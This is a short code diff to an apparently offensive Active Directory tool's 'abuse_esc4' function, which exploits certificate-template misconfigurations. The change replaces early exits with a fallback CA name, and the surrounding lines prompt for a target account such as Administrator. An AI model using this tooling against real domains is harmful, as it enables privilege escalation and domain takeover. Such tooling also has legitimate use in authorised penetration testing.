@@ -8,13 +8,13 @@ def abuse_esc4(session, template):
 
     cas = session.adcs_metadata.get("cas", [])
     if not cas:
-        print(red("[-] No CA data in session. Run 'adcs enum' first."))
-        return
-
-    ca_name = cas[0].get("name")
-    if not ca_name or ca_name.lower() == "n/a":
-        print(red("[-] Invalid CA name in session metadata."))
-        return
+        print(yellow("[!] No CA data found in session. Using fallback 'UNKNOWN-CA'."))
+        ca_name = "UNKNOWN-CA"
+    else:
+        ca_name = cas[0].get("name", "").strip()
+        if not ca_name or ca_name.lower() in ["n/a", "none", ""]:
+            print(yellow("[!] CA name is missing or invalid. Using fallback 'UNKNOWN-CA'."))
+            ca_name = "UNKNOWN-CA"
 
     target_upn = input(f"[?] Enter target UPN (e.g., Administrator@{session.domain}): ").strip()
     if not target_upn or "@" not in target_upn:
@@ -51,4 +51,3 @@ def abuse_esc4(session, template):
         print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))
 
     print(yellow(f"[*] Command executed: {req_cmd}"))
-    
